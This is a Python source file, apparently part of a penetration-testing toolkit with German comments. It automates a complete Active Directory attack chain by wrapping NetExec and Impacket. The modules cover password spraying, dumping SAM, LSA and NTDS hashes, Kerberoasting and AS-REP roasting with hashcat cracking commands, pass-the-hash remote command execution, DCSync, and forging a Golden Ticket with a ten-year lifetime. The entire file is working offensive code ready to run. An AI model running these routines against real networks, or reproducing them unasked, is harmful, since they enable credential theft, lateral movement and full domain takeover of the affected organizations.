"""
PenKit Active Directory Suite — vollständige AD-Angriffskette.

Module:
  1. CME/NetExec   — SMB-Enum, Pass-the-Hash, Lateral Movement, Secrets dump
  2. Kerberoasting — Service-Account-Hashes ohne Auth (Impacket GetUserSPNs)
  3. AS-REP Roast  — Accounts ohne Pre-Auth (Impacket GetNPUsers)
  4. Pass-the-Hash — Shell mit NTLM-Hash statt Passwort (pth-winexe/CME/psexec)
  5. BloodHound    — SharpHound via PS1 starten, JSON sammeln
  6. LDAP Dump     — Benutzer/Gruppen/Computer via ldapsearch / Impacket
  7. DC Sync       — Alle Hashes via impacket-secretsdump (Domain Admin nötig)
  8. Golden Ticket — Krbtgt-Hash → TGT für jeden Account

Benötigt: impacket, crackmapexec/netexec, ldap-utils, bloodhound-python
  apt install impacket-scripts crackmapexec bloodhound.py ldap-utils
  pip3 install impacket bloodhound
"""

from __future__ import annotations
import asyncio
import shutil
from typing import AsyncGenerator

from core.runner import CommandRunner
from core.output_dir import get as out_dir


def _cme() -> str:
    """Findet crackmapexec oder netexec."""
    for b in ("netexec", "nxc", "crackmapexec", "cme"):
        if shutil.which(b):
            return b
    return "netexec"


def _impacket(tool: str) -> str:
    """Impacket-Tool — verschiedene Installationspfade."""
    for variant in (tool, f"impacket-{tool}", f"{tool}.py"):
        if shutil.which(variant):
            return variant
    return tool


# ── SMB Enumeration ──────────────────────────────────────────────────────────

async def smb_enum(
    target: str,
    domain: str = "",
    user: str = "",
    password: str = "",
    hash_: str = "",
) -> AsyncGenerator[str, None]:
    """
    Vollständige SMB-Enumeration via CME/NetExec:
      Shares, Sessions, Logged-on Users, Disks, Groups, Passwords-Policy, RID Brute
    """
    runner = CommandRunner()
    cme = _cme()

    base = [cme, "smb", target]
    if domain:
        base += ["-d", domain]
    if hash_:
        base += ["-u", user or "Administrator", "-H", hash_]
    elif user and password:
        base += ["-u", user, "-p", password]
    else:
        base += ["-u", "", "-p", ""]

    checks = [
        ("--shares",           "Shares"),
        ("--sessions",         "Aktive Sessions"),
        ("--loggedon-users",   "Angemeldete User"),
        ("--disks",            "Disks"),
        ("--groups",           "Gruppen"),
        ("--pass-pol",         "Passwort-Policy"),
        ("--rid-brute",        "RID Brute (Usernames)"),
    ]

    for flag, label in checks:
        yield f"\n\033[1;36m[*] {label}...\033[0m"
        async for line in runner.run(base + [flag]):
            yield f"  {line}"


async def smb_spray(
    targets: str,
    user_file: str,
    password: str,
    domain: str = "",
    continue_on_success: bool = True,
) -> AsyncGenerator[str, None]:
    """Password-Spray via CME — ein Passwort gegen viele User (umgeht Lockout)."""
    runner = CommandRunner()
    cme = _cme()

    yield f"\033[1;33m[!] Password-Spray: {password} gegen alle User in {user_file}\033[0m"
    yield "\033[33m    Warnung: zu viele Versuche = Account-Lockout!\033[0m\n"

    cmd = [cme, "smb", targets, "-u", user_file, "-p", password, "--no-bruteforce"]
    if domain:
        cmd += ["-d", domain]
    if continue_on_success:
        cmd += ["--continue-on-success"]

    async for line in runner.run(cmd):
        if "[+]" in line:
            yield f"\033[1;32m  ✓ {line}\033[0m"
        elif "[-]" in line:
            yield f"\033[90m  ✗ {line}\033[0m"
        else:
            yield f"  {line}"


async def dump_secrets(
    target: str,
    domain: str,
    user: str,
    password: str = "",
    hash_: str = "",
) -> AsyncGenerator[str, None]:
    """
    secretsdump via Impacket — dumpt SAM, LSA-Secrets, NTDS.dit Hashes.
    Braucht Domain Admin oder SeBackupPrivilege.
    """
    runner = CommandRunner()
    tool = _impacket("secretsdump")

    if hash_:
        auth = f"{domain}/{user}@{target} -hashes :{hash_}"
    else:
        auth = f"{domain}/{user}:{password}@{target}"

    out_file = out_dir("network") / f"secretsdump_{target.replace('.','_')}.txt"

    yield f"\033[1;36m[*] Starte secretsdump gegen {target}...\033[0m"
    yield "    (dumpt SAM, LSA Secrets, NTDS.dit Hashes)\n"

    lines = []
    async for line in runner.run([tool] + auth.split() + ["-outputfile", str(out_file)]):
        lines.append(line)
        if "$" in line or "::" in line:
            yield f"\033[32m  {line}\033[0m"
        else:
            yield f"  {line}"

    yield f"\n\033[32m[✓] Hashes gespeichert: {out_file}.ntds\033[0m"


# ── Kerberoasting ─────────────────────────────────────────────────────────────

async def kerberoast(
    dc_ip: str,
    domain: str,
    user: str,
    password: str = "",
    hash_: str = "",
) -> AsyncGenerator[str, None]:
    """
    Kerberoasting — Service-Account TGS-Tickets requesten + cracken.
    Kein besonderer Privilege nötig, nur Domain-User.
    """
    runner = CommandRunner()
    tool = _impacket("GetUserSPNs")
    out_file = out_dir("passwords") / f"kerberoast_{domain}.hashes"

    yield "\033[1;36m[*] Kerberoasting — Service-Account Hashes requesten...\033[0m"
    yield "    Jeden gefundenen Hash mit: hashcat -m 13100 hash.txt rockyou.txt\n"

    if hash_:
        creds = f"{domain}/{user} -hashes :{hash_}"
    else:
        creds = f"{domain}/{user}:{password}"

    cmd = [tool] + creds.split() + [
        "-dc-ip", dc_ip,
        "-request",
        "-outputfile", str(out_file),
    ]

    async for line in runner.run(cmd):
        if "$krb5tgs$" in line:
            yield f"\033[1;32m  ✓ TGS-Hash gefunden!\033[0m"
            yield f"\033[32m  {line[:80]}...\033[0m"
        elif "SPN" in line or "ServicePrincipalName" in line:
            yield f"\033[33m  {line}\033[0m"
        else:
            yield f"  {line}"

    yield f"\n\033[32m[✓] Hashes: {out_file}\033[0m"
    yield f"\033[36m[→] Cracken: hashcat -m 13100 {out_file} /usr/share/wordlists/rockyou.txt\033[0m"


# ── AS-REP Roasting ───────────────────────────────────────────────────────────

async def asrep_roast(
    dc_ip: str,
    domain: str,
    user_file: str = "",
    user: str = "",
) -> AsyncGenerator[str, None]:
    """
    AS-REP Roasting — Accounts ohne Kerberos Pre-Auth angreifen.
    Funktioniert OHNE Credentials (unauthenticated).
    """
    runner = CommandRunner()
    tool = _impacket("GetNPUsers")
    out_file = out_dir("passwords") / f"asrep_{domain}.hashes"

    yield "\033[1;36m[*] AS-REP Roasting — keine Pre-Auth Accounts suchen...\033[0m"
    yield "    Kein Passwort nötig — nur Domain + DC IP\n"

    cmd = [tool, f"{domain}/", "-dc-ip", dc_ip, "-no-pass", "-format", "hashcat"]
    if user_file:
        cmd += ["-usersfile", user_file]
    elif user:
        cmd += ["-user", user]

    hashes = []
    async for line in runner.run(cmd):
        if "$krb5asrep$" in line:
            hashes.append(line)
            yield f"\033[1;32m  ✓ AS-REP Hash gefunden!\033[0m"
            yield f"\033[32m  {line[:80]}...\033[0m"
        elif "[-]" in line:
            yield f"\033[90m  {line}\033[0m"
        else:
            yield f"  {line}"

    if hashes:
        out_file.write_text("\n".join(hashes))
        yield f"\n\033[32m[✓] Hashes gespeichert: {out_file}\033[0m"
        yield f"\033[36m[→] Cracken: hashcat -m 18200 {out_file} /usr/share/wordlists/rockyou.txt\033[0m"
    else:
        yield "\n\033[33m[~] Keine anfälligen Accounts gefunden.\033[0m"


# ── Pass-the-Hash ─────────────────────────────────────────────────────────────

async def pass_the_hash(
    target: str,
    domain: str,
    user: str,
    ntlm_hash: str,
    command: str = "whoami /all",
) -> AsyncGenerator[str, None]:
    """
    Pass-the-Hash — Shell mit NTLM-Hash, kein Klartextpasswort nötig.
    Versucht: CME → psexec → wmiexec → smbexec
    """
    runner = CommandRunner()
    cme = _cme()

    yield f"\033[1;36m[*] Pass-the-Hash gegen {target}...\033[0m"
    yield f"    User: {domain}\\{user}  Hash: {ntlm_hash[:16]}...\n"

    # Methode 1: CME
    yield "\033[36m[1] CME exec...\033[0m"
    async for line in runner.run([
        cme, "smb", target,
        "-d", domain, "-u", user, "-H", ntlm_hash,
        "-x", command,
    ]):
        if "[+]" in line or "Pwn3d!" in line.lower():
            yield f"\033[1;32m  ✓ {line}\033[0m"
        else:
            yield f"  {line}"

    # Methode 2: psexec
    yield "\n\033[36m[2] impacket-psexec...\033[0m"
    psexec = _impacket("psexec")
    async for line in runner.run([
        psexec, f"{domain}/{user}@{target}",
        "-hashes", f":{ntlm_hash}",
        "-c", command,
    ]):
        yield f"  {line}"

    yield f"\n\033[36m[→] Interaktive Shell: {cme} smb {target} -d {domain} -u {user} -H {ntlm_hash} -x 'cmd.exe'\033[0m"


# ── BloodHound Daten sammeln ──────────────────────────────────────────────────

async def bloodhound_collect(
    dc_ip: str,
    domain: str,
    user: str,
    password: str = "",
    hash_: str = "",
    collection: str = "All",
) -> AsyncGenerator[str, None]:
    """
    BloodHound Daten via bloodhound-python sammeln.
    JSON-Dateien für BloodHound Desktop generieren.
    """
    runner = CommandRunner()
    out = out_dir("osint") / "bloodhound"
    out.mkdir(parents=True, exist_ok=True)

    yield "\033[1;36m[*] BloodHound Datensammlung startet...\033[0m"
    yield f"    Collection: {collection}  →  {out}\n"

    cmd = [
        "bloodhound-python",
        "-d", domain,
        "-u", user,
        "-dc", dc_ip,
        "-c", collection,
        "--zip",
        "--outputdir", str(out),
    ]
    if hash_:
        cmd += ["--hashes", hash_]
    elif password:
        cmd += ["-p", password]

    async for line in runner.run(cmd):
        if "Done" in line or "Finished" in line:
            yield f"\033[32m  ✓ {line}\033[0m"
        elif "Error" in line.title() or "error" in line:
            yield f"\033[31m  ✗ {line}\033[0m"
        else:
            yield f"  {line}"

    yield f"\n\033[32m[✓] BloodHound Daten: {out}\033[0m"
    yield "\033[36m[→] BloodHound Desktop öffnen → Upload Data → JSON-Dateien importieren\033[0m"
    yield "\033[36m[→] Wichtige Queries:\033[0m"
    yield "    • Shortest Path to Domain Admins"
    yield "    • Find all Domain Admins"
    yield "    • Find Kerberoastable Users"
    yield "    • Find AS-REP Roastable Users"


# ── LDAP Dump ─────────────────────────────────────────────────────────────────

async def ldap_dump(
    dc_ip: str,
    domain: str,
    user: str = "",
    password: str = "",
) -> AsyncGenerator[str, None]:
    """Dumpt AD-Benutzer, Gruppen, Computer via ldapsearch."""
    runner = CommandRunner()
    out_file = out_dir("osint") / f"ldap_{domain.replace('.','_')}.txt"

    domain_dn = ",".join(f"DC={p}" for p in domain.split("."))
    bind_dn = f"CN={user},CN=Users,{domain_dn}" if user else ""

    yield f"\033[1;36m[*] LDAP Dump von {dc_ip} ({domain})...\033[0m\n"

    queries = [
        ("Benutzer",   f"(objectClass=user)",        "sAMAccountName,displayName,memberOf,lastLogon"),
        ("Gruppen",    f"(objectClass=group)",        "sAMAccountName,member"),
        ("Computer",   f"(objectClass=computer)",     "sAMAccountName,operatingSystem,dNSHostName"),
        ("Domain Admins", f"(memberOf=CN=Domain Admins,CN=Users,{domain_dn})", "sAMAccountName"),
    ]

    all_output = []
    for label, filt, attrs in queries:
        yield f"\033[36m[*] {label}...\033[0m"
        cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc_ip}", "-b", domain_dn]
        if bind_dn and password:
            cmd += ["-D", bind_dn, "-w", password]
        cmd += [filt] + attrs.split(",")

        async for line in runner.run(cmd):
            all_output.append(line)
            if any(k in line for k in ("sAMAccountName:", "displayName:", "operatingSystem:")):
                yield f"  \033[32m{line}\033[0m"
        yield ""

    out_file.write_text("\n".join(all_output))
    yield f"\033[32m[✓] LDAP-Dump: {out_file}\033[0m"


# ── DC Sync (alle Hashes) ─────────────────────────────────────────────────────

async def dcsync(
    dc_ip: str,
    domain: str,
    user: str,
    password: str = "",
    hash_: str = "",
    target_user: str = "",
) -> AsyncGenerator[str, None]:
    """
    DCSync — repliziert NTDS.dit via MS-DRSR Protokoll.
    Braucht: Domain Admin oder Replication-Rechte.
    Kein Login auf DC nötig — rein über Netzwerk.
    """
    runner = CommandRunner()
    tool = _impacket("secretsdump")
    out_file = out_dir("passwords") / f"dcsync_{domain.replace('.','_')}.hashes"

    yield f"\033[1;31m[*] DCSync gegen {domain}...\033[0m"
    yield "    Repliziert alle NTLM-Hashes aus NTDS.dit\n"

    creds = f"{domain}/{user}"
    if hash_:
        creds += f" -hashes :{hash_}"
    else:
        creds += f":{password}"

    cmd = [tool] + creds.split() + [
        f"-dc-ip", dc_ip,
        "-just-dc",
    ]
    if target_user:
        cmd += ["-just-dc-user", target_user]

    cmd.append(f"{domain}/{user}@{dc_ip}")

    hashes = []
    async for line in runner.run(cmd):
        if "::" in line and "$" not in line[:1]:
            hashes.append(line)
            parts = line.split(":")
            if len(parts) >= 4:
                yield f"\033[32m  {parts[0]:<25} {parts[3][:32]}\033[0m"
        else:
            yield f"  {line}"

    if hashes:
        out_file.write_text("\n".join(hashes))
        yield f"\n\033[32m[✓] {len(hashes)} Hashes gespeichert: {out_file}\033[0m"
        yield "\033[36m[→] Admin-Hash cracken oder direkt Pass-the-Hash nutzen\033[0m"


# ── Golden Ticket ─────────────────────────────────────────────────────────────

async def golden_ticket(
    domain: str,
    domain_sid: str,
    krbtgt_hash: str,
    target_user: str = "Administrator",
    groups: str = "512,513,518,519,520",
) -> AsyncGenerator[str, None]:
    """
    Golden Ticket — mit krbtgt-Hash TGT für beliebigen Account erstellen.
    Domain-weiter Zugriff, läuft 10 Jahre.
    """
    runner = CommandRunner()
    tool = _impacket("ticketer")
    out_file = out_dir("payloads") / f"golden_{target_user}.ccache"

    yield f"\033[1;31m[*] Golden Ticket für {target_user}@{domain}...\033[0m\n"

    cmd = [
        tool,
        "-nthash", krbtgt_hash,
        "-domain-sid", domain_sid,
        "-domain", domain,
        "-groups", groups,
        "-duration", "3650",
        target_user,
    ]

    async for line in runner.run(cmd):
        yield f"  {line}"

    yield f"\n\033[32m[✓] Golden Ticket: {out_file}\033[0m"
    yield "\n\033[36m[→] Ticket nutzen:\033[0m"
    yield f"  export KRB5CCNAME={out_file}"
    yield f"  {_impacket('psexec')} {domain}/{target_user}@<dc-ip> -k -no-pass"
    yield f"  {_impacket('wmiexec')} {domain}/{target_user}@<dc-ip> -k -no-pass"
